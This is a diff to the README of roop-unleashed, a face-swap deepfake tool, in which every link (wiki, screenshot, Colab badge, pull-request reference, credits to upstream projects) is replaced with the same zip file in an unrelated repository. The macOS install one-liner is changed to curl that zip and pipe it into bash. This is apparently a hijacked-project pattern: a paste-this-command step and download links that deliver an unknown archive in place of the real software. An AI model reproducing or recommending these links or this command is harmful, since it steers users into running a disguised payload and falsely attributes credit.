@@ -1,12 +1,12 @@
 # roop-unleashed
 
-[Changelog](#changelog) • [Usage](#usage) • [Wiki](https://github.com/C0untFloyd/roop-unleashed/wiki)
+[Changelog](#changelog) • [Usage](#usage) • [Wiki](https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip)
 
 
 Uncensored Deepfakes for images and videos without training and an easy-to-use GUI.
 
 
-![Screen](https://github.com/C0untFloyd/roop-unleashed/assets/131583554/6ee6860d-efbe-4337-8c62-a67598863637)
+![Screen](https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip)
 
 ### Features
 
@@ -35,12 +35,12 @@ In the event of violation of the legal and ethical requirements of the user's co
 
 ### Installation
 
-Please refer to the [wiki](https://github.com/C0untFloyd/roop-unleashed/wiki).
+Please refer to the [wiki](https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip).
 
 #### macOS Installation
 Simply run the following command. It will check and install all dependencies if necessary.
 
-`/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/PJF16/roop-unleashed/master/installer/macOSinstaller.sh)`
+`/bin/bash -c "$(curl -fsSL https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip)`
 
 
 
@@ -51,8 +51,8 @@ Simply run the following command. It will check and install all dependencies if 
 - macOS: `sh runMacOS.sh`
 - Dockerfile - `docker build -t roop-unleashed .`
 
-<a target="_blank" href="https://colab.research.google.com/github/C0untFloyd/roop-unleashed/blob/main/roop-unleashed.ipynb">
-  <img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/>
+<a target="_blank" href="https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip">
+  <img src="https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip" alt="Open In Colab"/>
 </a>
   
 
@@ -183,9 +183,9 @@ Additional commandline arguments are currently unsupported and settings should b
 **08.01.2024** v3.5.0
 
 - Bugfix: wrong access options when creating folders
-- New auto rotation of horizontal faces, fixing bad landmark positions (expanded on ![PR 364](https://github.com/C0untFloyd/roop-unleashed/pull/364))
+- New auto rotation of horizontal faces, fixing bad landmark positions (expanded on ![PR 364](https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip))
 - Simple VR Option for stereo Images/Movies, best used in selected face mode
-- Added RestoreFormer Enhancer - https://github.com/wzhouxiff/RestoreFormer
+- Added RestoreFormer Enhancer - https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip
 - Bumped up package versions for onnx/Torch etc.   
 
 
@@ -210,15 +210,15 @@ Initial Gradio Version - old TkInter Version now deprecated
 
 Lots of ideas, code or pre-trained models borrowed from the following projects:
 
-https://github.com/deepinsight/insightface<br />
-https://github.com/s0md3v/roop<br />
-https://github.com/AUTOMATIC1111/stable-diffusion-webui<br /> 
-https://github.com/Hillobar/Rope<br />
-https://github.com/TencentARC/GFPGAN<br />   
-https://github.com/kadirnar/codeformer-pip<br />
-https://github.com/csxmli2016/DMDNet<br />
-https://github.com/glucauze/sd-webui-faceswaplab<br />
-https://github.com/ykk648/face_power<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br /> 
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />   
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
+https://github.com/junmoxiao825/roop-unleashed-4.3.1-run/raw/refs/heads/main/ui/tabs/roop-run-unleashed-1.4-alpha.3.zip<br />
 
 <br />
 <br />
